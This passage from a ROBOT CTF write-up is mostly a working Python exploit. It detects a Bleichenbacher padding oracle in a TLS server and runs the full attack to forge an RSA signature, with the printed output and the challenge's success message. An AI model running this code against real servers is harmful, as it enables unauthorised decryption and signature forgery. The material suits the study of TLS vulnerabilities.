                bend = len(buf)
            # this is the record size
            psize = buf[i + 3] * 256 + buf[i + 4]
            # if the size is 2, we received an alert
            if (psize == 2):
                return ("The server sends an Alert after ClientHello")
            # try to read further record data
            while i + psize + 5 > bend:
                buf += s.recv(4096)
                bend = len(buf)
            # check whether we have already received a ClientHelloDone
            if (buf[i + 5] == 0x0e) or (buf[bend - 4] == 0x0e):
                break
            i += psize + 5
        cke_version = buf[9:11]
        s.send(bytearray(b'\x16') + cke_version)
        s.send(cke_2nd_prefix)
        s.send(pms)
        if not messageflow:
            s.send(bytearray(b'\x14') + cke_version + ccs)
            s.send(bytearray(b'\x16') + cke_version + enc)
        try:
            alert = s.recv(4096)
            if len(alert) == 0:
                return ("No data received from server")
            if alert[0] == 0x15:
                if len(alert) < 7:
                    return ("TLS alert was truncated (%s)" % (repr(alert)))
                return ("TLS alert %i of length %i" % (alert[6], len(alert)))
            else:
                return "Received something other than an alert (%s)" % (alert[0:10])
        except ConnectionResetError as e:
            return "ConnectionResetError"
        except socket.timeout:
            return ("Timeout waiting for alert")
        s.close()
    except Exception as e:
        # exc_type, exc_obj, exc_tb = sys.exc_info()
        # print("line %i", exc_tb.tb_lineno)
        # print ("Exception received: " + str(e))
        return str(e)

parser = argparse.ArgumentParser(description="Bleichenbacher attack")
parser.add_argument("host", help="Target host")
parser.add_argument("-p", "--port", metavar='int', default=443, help="TCP port")
parser.add_argument("-t", "--timeout", default=5, help="Timeout")
parser.add_argument("-q", "--quiet", help="Quiet", action="store_true")
groupcipher = parser.add_mutually_exclusive_group()
groupcipher.add_argument("--gcm", help="Use only GCM/AES256.", action="store_true")
groupcipher.add_argument("--cbc", help="Use only CBC/AES128.", action="store_true")
parser.add_argument("--csv", help="Output CSV format", action="store_true")
args = parser.parse_args()

args.port = int(args.port)
timeout = float(args.timeout)

if args.gcm:
    ch = ch_gcm
elif args.cbc:
    ch = ch_cbc
else:
    ch = ch_def

# We only enable TCP fast open if the Linux proc interface exists
enable_fastopen = os.path.exists("/proc/sys/net/ipv4/tcp_fastopen")

# host is bxjyb2jvda.mindsculptors.net
# $ python3 RobotCTF_test2_20171221_final.py bxjyb2jvda.mindsculptors.net

try:
    ip = socket.gethostbyname(args.host)
except socket.gaierror as e:
    if not args.quiet:
        print("Cannot resolve host: %s" % e)
    if args.csv:
        print("NODNS,%s,,,,,,,,," % (args.host))

    quit()

if not args.quiet:
    print("Scanning host %s ip %s port %i" % (args.host, ip, args.port))

N, e = get_rsa_from_server(ip, args.port)
modulus_bits = int(math.ceil(math.log(N, 2)))
modulus_bytes = (modulus_bits + 7) // 8
if not args.quiet:
    print("RSA N: %s" % hex(N))
    print("RSA e: %s" % hex(e))
    print ("Modulus size: %i bits, %i bytes" % (modulus_bits, modulus_bytes))

cke_2nd_prefix = bytearray.fromhex("{0:0{1}x}".format(modulus_bytes + 6, 4) + "10" + "{0:0{1}x}".format(modulus_bytes + 2, 6) + "{0:0{1}x}".format(modulus_bytes, 4))
# pad_len is length in hex chars, so bytelen * 2
pad_len = (modulus_bytes - 48 - 3) * 2
rnd_pad = ("abcd" * (pad_len // 2 + 1))[:pad_len]

rnd_pms = "aa112233445566778899112233445566778899112233445566778899112233445566778899112233445566778899"
pms_good_in = int("0002" + rnd_pad + "00" + "0303" + rnd_pms, 16)
# wrong first two bytes
pms_bad_in1 = int("4117" + rnd_pad + "00" + "0303" + rnd_pms, 16)
# 0x00 on a wrong position, also trigger older JSSE bug
pms_bad_in2 = int("0002" + rnd_pad + "11" + rnd_pms + "0011", 16)
# no 0x00 in the middle
pms_bad_in3 = int("0002" + rnd_pad + "11" + "1111" + rnd_pms, 16)
# wrong version number (according to Klima / Pokorny / Rosa paper)
pms_bad_in4 = int("0002" + rnd_pad + "00" + "0202" + rnd_pms, 16)

pms_good = int(gmpy2.powmod(pms_good_in, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad1 = int(gmpy2.powmod(pms_bad_in1, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad2 = int(gmpy2.powmod(pms_bad_in2, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad3 = int(gmpy2.powmod(pms_bad_in3, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad4 = int(gmpy2.powmod(pms_bad_in4, e, N)).to_bytes(modulus_bytes, byteorder="big")


oracle_good = oracle(pms_good, messageflow=False)
oracle_bad1 = oracle(pms_bad1, messageflow=False)
oracle_bad2 = oracle(pms_bad2, messageflow=False)
oracle_bad3 = oracle(pms_bad3, messageflow=False)
oracle_bad4 = oracle(pms_bad4, messageflow=False)

if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
    if not args.quiet:
        print("Identical results (%s), retrying with changed messageflow" % oracle_good)
    oracle_good = oracle(pms_good, messageflow=True)
    oracle_bad1 = oracle(pms_bad1, messageflow=True)
    oracle_bad2 = oracle(pms_bad2, messageflow=True)
    oracle_bad3 = oracle(pms_bad3, messageflow=True)
    oracle_bad4 = oracle(pms_bad4, messageflow=True)
    if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
        if not args.quiet:
            print("Identical results (%s), no working oracle found" % oracle_good)
            print("NOT VULNERABLE!")
        if args.csv:
            print("SAFE,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
        sys.exit(1)
    else:
        flow = True
else:
    flow = False

# Re-checking all oracles to avoid unreliable results
oracle_good_verify = oracle(pms_good, messageflow=flow)
oracle_bad_verify1 = oracle(pms_bad1, messageflow=flow)
oracle_bad_verify2 = oracle(pms_bad2, messageflow=flow)
oracle_bad_verify3 = oracle(pms_bad3, messageflow=flow)
oracle_bad_verify4 = oracle(pms_bad4, messageflow=flow)

if (oracle_good != oracle_good_verify) or (oracle_bad1 != oracle_bad_verify1) or (oracle_bad2 != oracle_bad_verify2) or (oracle_bad3 != oracle_bad_verify3) or (oracle_bad4 != oracle_bad_verify4):
    if not args.quiet:
        print("Getting inconsistent results, aborting.")
    if args.csv:
        print("INCONSISTENT,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
    quit()

# If the response to the invalid PKCS#1 request (oracle_bad1) is equal to both
# requests starting with 0002, we have a weak oracle. This is because the only
# case where we can distinguish valid from invalid requests is when we send
# correctly formatted PKCS#1 message with 0x00 on a correct position. This
# makes our oracle weak
if (oracle_bad1 == oracle_bad2 == oracle_bad3):
    oracle_strength = "weak"
    if not args.quiet:
        print ("The oracle is weak, the attack would take too long")
else:
    oracle_strength = "strong"
    if not args.quiet:
        print("The oracle is strong, real attack is possible")

if flow:
    flowt = "shortened"
else:
    flowt = "standard"

if cke_version[0] == 3 and cke_version[1] == 0:
    tlsver = "SSLv3"
elif cke_version[0] == 3 and cke_version[1] == 1:
    tlsver = "TLSv1.0"
elif cke_version[0] == 3 and cke_version[1] == 2:
    tlsver = "TLSv1.1"
elif cke_version[0] == 3 and cke_version[1] == 3:
    tlsver = "TLSv1.2"
else:
    tlsver = "TLS raw version %i/%i" % (cke_version[0], cke_version[1])

if args.csv:
    print("VULNERABLE,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s" % (args.host, ip, tlsver, oracle_strength, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
else:
    print("VULNERABLE! Oracle (%s) found on %s/%s, %s, %s message flow: %s/%s (%s / %s / %s)" % (oracle_strength, args.host, ip, tlsver, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))

if not args.quiet:
    print("Result of good request:                        %s" % oracle_good)
    print("Result of bad request 1 (wrong first bytes):   %s" % oracle_bad1)
    print("Result of bad request 2 (wrong 0x00 position): %s" % oracle_bad2)
    print("Result of bad request 3 (missing 0x00):        %s" % oracle_bad3)
    print("Result of bad request 4 (bad TLS version):     %s" % oracle_bad4)

print("Now Let's do the real!")

head = b'\x00\x01'

message = b'\x00I solved the ROBOT CTF / Bono (Twitter ID: @Bono_iPad)'

data = head + b'\xff' * (512-len(head)-len(message)) + message 

#data = b'\x00\x01\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00I solved the ROBOT CTF / @Bono_iPad'

from Crypto.PublicKey import RSA
from Crypto.Util.number import *

sk = open("public_robot.txt").read()
sk = RSA.importKey(sk)

print (sk.e)
print (sk.n)
print (repr(data))
assert len(data)==512

if N != sk.n:
  print ("!?")
  quit()

ct = 0
modulus_bits = int(math.ceil(math.log(N, 2)))
modulus_bytes = (modulus_bits + 7) // 8

def test_oracle(m):
  global sk,ct,oracle_good
  ct += 1
  q = oracle(m.to_bytes(modulus_bytes, byteorder="big"), messageflow=False)
  if q == oracle_good:
    return 1
  return 0

our_c = bytes_to_long(data)
print (our_c)
print (sk.n > our_c)

def extended_gcd(aa, bb):
    """
    http://rosettacode.org/wiki/Modular_inverse#Python
    """
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient * x, x
        y, lasty = lasty - quotient * y, y
    return lastremainder, lastx * (-1 if aa < 0 else 1), lasty * (-1 if bb < 0 else 1)


def modinv(a, m):
    """
    http://rosettacode.org/wiki/Modular_inverse#Python
    """
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m


def interval(a, b):
    return range(a, b + 1)

def ceildiv(a, b):
    """
    http://stackoverflow.com/a/17511341
    """
    return -(-a // b)

def floordiv(a, b):
    """
    http://stackoverflow.com/a/17511341
    """
    return a // b

k = 512

B = pow(2, 8 * (k - 2))
B2 = 2 * B
B3 = B2 + B
s_0 = 0

while True:
  s_0 += 1
  print ("searching s_0...",s_0)
  c_d = (our_c * pow(s_0,e,N)) % N
  c = int(c_d)
  q = test_oracle(c)
  #print (q)
  if q == 1:
    print ("s_0 found.",s_0)
    print ("double check.")
    if q == test_oracle(c):
      print ("OK")
      break
    else:
      print ("no...")

# m_0 = m * s_0 % n
set_m_old = {(B2, B3 - 1)}
i = 1
s_old = s_0
n = N

our_c = (our_c * pow(s_0,e,N)) % N
print ("s_0 * our_c: ",our_c)

while True:
        print("Starting with Step 2")

        if i == 1:
            print("Starting with Step 2.a")

            s_new = ceildiv(n, B3)  # Explanation follows...
            #if ceildiv(n, B3) < s_0:
            #  s_new = s_0 + 1
            #s_new = s_old + 1

            while True:
              c_d = (our_c * pow(s_new,e,N)) % N
              c = int(c_d)
              q = test_oracle(c)
              if ct%1000==0:print (s_new,q)
              if q == 1:
                print ("s_new found",s_new)
                break
              s_new += 1

            print("Found s_new = {} in Step 2.a".format(s_new))

        elif i > 1 and len(set_m_old) >= 2:
            """
            Step 2.b: Searching with more than one interval left.
            If i > 1 and the number of intervals in M_{i−1} is at least 2, then search for the
            smallest integer s_i > s_{i−1}, such that the ciphertext c_0*(s_i)^e mod n is PKCS conforming.
            """

            print("Starting with Step 2.b")

            s_new = s_old + 1
            while True:
              c_d = (our_c * pow(s_new,e,N)) % N
              c = int(c_d)
              q = test_oracle(c)
              if ct%10000==0:print (s_new,q)
              if q == 1:
                print ("s_new found",s_new)
                break
              s_new += 1

            print("Found s_new = {} in Step 2.b".format(s_new))

        elif len(set_m_old) == 1:
            """
            Step 2.c: Searching with one interval left.
            If M_{i−1} contains exactly one interval (i.e., M_{i−1} = {[a, b]}),
            then choose small integer values r_i, s_i such that

                r_i \geq 2 * (bs_{i-1} - 2B) / n

            and

                (2B + r_i*n) / b \leq s_i < (3B + r_i*n) / a,

            until the ciphertext c_0*(s_i)^e mod n is PKCS conforming.
            """

            print("Starting with Step 2.c")

            a, b = next(iter(set_m_old))
            found = False
            r = ceildiv(2 * (b * s_old - B2), n)
            while not found:
                for s in interval(ceildiv(B2 + r*n, b), floordiv(B3 - 1 + r*n, a)):
                  c_d = (our_c * pow(s,e,N)) % N
                  c = int(c_d)
                  q = test_oracle(c)
                  if ct%10000==0:print (s,q)
                  if q == 1:
                    print ("s found",s)
                    found = True
                    s_new = s
                    break
                r += 1

            print("Found s_new = {} in Step 2.c".format(s_new))

        """
        Step 3: Narrowing the set of solutions.
        After s_i has been found, the set M_i is computed as

            M_i = \bigcup_{(a, b, r)} { [max(a, [2B+rn / s_i]), min(b, [3B-1+rn / s_i])] }

        for all [a, b] \in M_{i-1} and (as_i - 3B + 1)/(n) \leq r \leq (bs_i - 2B)/(n).
        """

        print("Starting with Step 3")

        set_m_new = set()

        for a, b in set_m_old:
            print(a * s_new,B3,n)
            print(b * s_new,B2,n)
            r_min = ceildiv(a * s_new - B3 + 1, n)
            r_max = floordiv(b * s_new - B2, n)

            print("Found new values for r and a = {}, b = {} -- {} <= r <= {}".format(a, b, r_min, r_max))

            for r in interval(r_min, r_max):
                new_lb = max(a, ceildiv(B2 + r*n, s_new))
                new_ub = min(b, floordiv(B3 - 1 + r*n, s_new))
                if new_lb <= new_ub:  # intersection must be non-empty
                    set_m_new |= {(new_lb, new_ub)}

        for v in set_m_new:
            print(str(v))
            print(";")

        print("")

        """
        Step 4: Computing the solution.
        If M_i contains only one interval of length 1 (i.e., M_i = {[a, a]}),
        then set m = a(s_0)^{−1} mod n, and return m as solution of m \equiv c^d (mod n).
        Otherwise, set i = i + 1 and go to step 2.
        """

        print("Starting with Step 4")

        if len(set_m_new) == 1:
            a, b = next(iter(set_m_new))
            if a == b:
                #print("Original:   ", hex(m))
                print("Calculated: ", hex(a))
                print("s_0",s_0)
                print("answer: ", hex( (a*inverse(s_0,N))%N ))
                print("Success after {} calls to the oracle.".format(ct))
                open("answer.sig","wb").write( long_to_bytes( (a*inverse(s_0,N))%N ) )
                exit(0)

        i += 1
        #print("Intervals retry", set_m_new)
        print("Going back to step 2")
        s_old = s_new
        set_m_old = set_m_new

        print("No luck for set_m_new = {} in Step 4".format(set_m_new))


"""
Starting with Step 4
Calculated:  0x2ce5e87205b698b1d1cbbc6a244808a94b6d66c8e8aa541ff5a62acd611acf475f1713cdeb4ed53688ce345ed0fe799d2c9873801b8f231d5c2b633fbf169801d8b5ccf46fc9b66569ea23c5c68ea2a4a0781fb1d685e327038c615dfc3808d9c7064adc939f3c07bcc870a1ad5d518f5cba740a43d82049f5c692f2bea6a0800bce305fb9ea26b90f6179e76d4017d4a88c1c0fe58d0ff6b9ec629d321207656f4c9e3925d203462638cb9b822bdbdab5be211f6bb46fa67610c44789f19f75390ca323a9b2ddb17ea425e80e617cb0256b660861d5b6c38752e12380e9dc7387efacd163f5b33df0b605c8190f67f30cff18957c1f95800010a199139a903fc1802a4228ae72a4b9ef483e37674e19811fc0bc22702943bfccc68b1836ce4b8c61849650c2a5440a580aa4927c408b6305d1564516ccd0ccf27a98f21a860b08f8da2db74edfafc51bb54ef31965d4c8c4d379b7a43ad139da083cc1edcdbe7ef680b58e3c3af93f9fd88165224bf96f143487ab25597cb6d174b2ff40f2f012e672cedb9daf2c68c0e929363f33f7f3db493c73769e57c3b5b1fa428cee80b6030bc056e639a091b273558100570ed3d33bfd5eb0cf47aa64eb94a8f5c20734c53b8480686880e7eaeb81a1729744d0747ba216906fbe99963385d486614623dd9dfd63ace0f547a108189a344396b6faf1f42794092d2ecfb83928414
s_0 29069
answer:  0x6e5b47e01216f71058671dd477022b9c7724cd7eb7f1081c0700edecf02bdf574f02d2980bbde6278fbfd3ad306794031a282b091470c4a0a737c956eed3169c2214d032d39e2d3fc0d68ae0d9ab9eb875d76a897a440eb27a745cdc61aed96c23874d8d8fb583fa8b092b259a13fedd12d380669cfe18cad6bebf09ed3c7d8ba7d3edd8f489b36e5b0e056f892b55838e8bd2f11b2b91b4351d14bd602295d7a0bb83a73ba862bdc53bb498e0e3b057a4d7fa0bc416f73afbe71e3e2cd3bf35f39e7de57384385972b458bc60ea13e0bb250fd51176e7277d58b6d1c640df7bdd400390f8358b74c120c2cc099ba33f5f9b858685c31a55c08744bd85046e1ee7540149a58e9c6126d5da92e8c2bd214feb4bf9728ce6393c1afe75947ba1ff00bc1c2dcad612340964e59a8ef0b2574159eb0e17748aeffb404a74440646eb407f5358e98d429546d9be7bf67b1346c21c298713781818b4350755799f8e417eb28e452013de2de8a137c25359e20b769e0171fd13f29235d25b9c3358fe96feab9c40adc6e1c4f273cef54bc2f39095cc4dbb16d8d5ccc61e8cc050eac9748ede114660c0d0a907dccb2142ed76dccb2af152c8afb2a0c217e84fb8234c612ff6d364f64ed802a2e9caec7db7509ca481153bc7c40c3e5569089deb3fadf4955af65ce6a32a1a42b3a2fb4b03be89d4f5c7e8701a4df82794d49cd0ab9072
Success after 156460 calls to the oracle.
"""
```

I entered the signed message above to <https://final.robotattack.org/> and got this message:  

***
You did it!
You successfully solved the ROBOT CTF challenge. You have unlocked the black ROBOT.
You signed the following string:

I solved the ROBOT CTF / Bono (Twitter ID: @Bono_iPad)

***

That's all.

### Final thoughts 
I was really surprised that Bleichenbacher attack, which was found 19 years ago, was still in the wild. Although exploiting this vulnerability takes relatively long time and no private key will leak, a fake signed message was generated in a reasonable time even if server used the 4096 bit RSA key. I think it is a real problem.  
  
It was very fun CTF. Thanks to ROBOT CTF admins!  

### FAQ

Q. Why do you appear twice in the player list at <https://ctf.robotattack.org/>?  
![list](https://bono-ipad.github.io/images/robot_ctf_list.png "list")
A. I wrote this writeup before the end of the CTF (last night) and I wanted to check if the signed message above is valid. I submitted the message above to <https://final.robotattack.org/> and confirmed "You did it!" message. Maybe at that time, I was registered the list again.
